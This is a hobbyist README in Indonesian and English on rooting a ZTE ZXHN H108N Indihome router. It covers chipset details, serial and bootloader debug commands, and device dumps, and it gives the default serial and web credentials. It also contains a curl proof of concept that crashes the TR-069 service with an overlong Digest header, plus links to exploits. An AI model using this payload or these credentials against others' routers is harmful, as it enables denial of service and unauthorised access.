# Oprek Modem Indihome Huawei ZXHN H108N

Goal:

- [ ] Gain root access (not yet works)
- [ ] Make it as Access Point, WAN From ethernet (not yet works)


If you have Broadcom version, you can use OpenWRT:
https://openwrt.org/toh/zte/zxhnh108n

This device is Ralink chipset, No root access
- Ralink RT63365E
- Ralink RT63087N
- MIPS 34K (Big Endian) (mips32_r2) (mipsbig) (mips)?

## Related Buildroot/toolchain ?

- https://github.com/executabls/dsl-n14u_gpl/wiki/Detailed-Device-Specs
- https://github.com/HyGw/test
- https://github.com/Sirherobrine23/Dir819gpl_code

## Serial Connection

No root access here.

![Huawei ZXHN H108N Serial Line](images/back-open-serial.jpg)

Password for Serial: theworldinyourhand

for web login: user: support, pwd: theworldinyourhand

**Some Information:**

```
ZTE> sys version

 RAS version: ZXHN H108NV4.0.1a_ZRQ_ID_D67                                     
 System   ID: $2.12.186.0(G94.BY.4)3.20.39.20  20140909_v004  [Sep  9 2014 10:12:52]
 romRasSize: 1664518 
 system up time:     0:10:20 (f273 ticks)
 bootbase version: VTC_SPI_8M1.16 |  2012/12/26

ZTE> sys atsh

RAS version            : ZXHN H108NV4.0.1a_ZRQ_ID_D67                                    
romRasSize             : 1664518
bootbase version       : VTC_SPI_8M1.16 |  2012/12/26
Product Model          : ZXHN H108N
Serial Number          : ZTEERQCG5V02440
MAC Address            : 343759D9B8D0
Default Country Code   : FF
Boot Module Debug Flag : 00
RomFile Version        : 16
RomFile Checksum       : 7076
RAS F/W Checksum       : 9605
SNMP MIB level & OID   : 050000000100000002000000030000000400000005
Main Feature Bits      : 86
Other Feature Bits     :
93 17 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 13 00 00 00

ZTE> sys feature

IPX: yes
IP ONLY: no
AUI: no
AB ADAPTER: no
IDSL ONLY: no
IDSL: no
INTERNAL HUB: no
VLAN_8021Q[web]: no
PKT QoS[web]: no
ACL[web]: no
Filter[web]: no
ADSL[web]: yes
USB[web]: no
Firewall[web]: no
Reverse ETH Ports[web]: no
Half Bridge[web]: no
dy.fi DNS: yes
DDNS: yes
tr069: yes

```

## Rooting

- Activate uPNP and ACS

**Vulnerabilities:**

- https://sudonull.com/post/59881-Too-many-cooks-or-hacking-the-Internet-with-TR-069
- Maybe work? https://www.exploit-db.com/exploits/27044

**Crash/Reboot PoC:**

``` bash
repeat(){ for i in {1..600}; do echo -n "$1"; done; }
curl -H "Authorization: Digest username=$(repeat x)" 192.168.1.1:7547/tr069

```
There's no file system in this firmware

# Debug Mode

Press any key on bootrom/bootloader, send `ATHE` to get help command

```
ATHE
======= Debug Command Listing =======
AT          just answer OK
ATHE          print help
ATBAx         change baudrate. 1:38.4k, 2:19.2k, 3:9.6k 4:57.6k 5:115.2k
ATENx,(y)     set BootExtension Debug Flag (y=password)
ATSE          show the seed of password generator
ATTI(h,m,s)   change system time to hour:min:sec or show current time
ATDA(y,m,d)   change system date to year/month/day or show current date
ATDS          dump RAS stack
ATDT          dump Boot Module Common Area
ATDUx,y       dump memory contents from address x for length y
ATRBx         display the  8-bit value of address x
ATRWx         display the 16-bit value of address x
ATRLx         display the 32-bit value of address x
ATGO(x)       run program at addr x or boot router
ATGR          boot router
ATGT          run Hardware Test Program
ATRTw,x,y(,z) RAM test level w, from address x to y (z iterations)
ATSH          dump manufacturer related data in ROM
ATDOx,y       download from address x for length y to PC via XMODEM
ATTD          download router configuration to PC via XMODEM
ATUR          upload router firmware to flash ROM
ATLC          upload router configuration file to flash ROM
ATXSx         xmodem select: x=0: CRC mode(default); x=1: checksum mode
ATLD          Upload Configuration File and Default ROM File to Flash
ATCD          Convert Running ROM File to Default ROM File into Flash

```

# Some Memory Dump

``` bash
# Confirming that bootloader is loaded on: BFC00000
ATRLbfc00000
BFC00000: 00000825   # move	at,zero

# SPI FLASH is mapped at 0xb0000000, you can see it on boot.log too
ATRLB0000000
```